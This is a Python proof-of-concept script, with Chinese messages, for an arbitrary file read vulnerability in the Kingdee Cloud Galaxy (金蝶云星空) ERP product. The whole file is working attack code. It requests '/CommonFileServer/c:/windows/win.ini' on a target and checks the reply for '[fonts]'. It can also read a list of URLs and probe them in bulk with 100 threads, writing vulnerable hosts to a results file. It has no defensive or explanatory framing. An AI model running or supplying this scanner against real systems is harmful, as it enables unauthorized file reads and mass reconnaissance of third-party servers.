import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
# banner 信息
def banner():
    test = """金蝶云星空"""
    print(test)
def poc(target):
    payload = '/CommonFileServer/c:/windows/win.ini'
    headers = {
        'accept': '*/*',
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/119.0.0.0Safari/537.36',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    try:
        res1 = requests.get(url=target)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload, headers=headers,verify=False,timeout=5)
            if '[fonts]' in res2.text:
                with open('金蝶_result_jin.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件读取漏洞\n")
                print(f"该{target}存在任意文件读取漏洞")
            else:
                print(f"该{target}不存在任意文件读取漏洞")
        else:
            print(f"该{target}存在错误无法访问")
    except Exception as e:
        print(f"该{target}可能存在任意文件上传漏洞请手工测试")
def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description="金蝶云星空任意文件读取漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误,请使用 python file_name.py -u url ")
if __name__ == '__main__':
    main()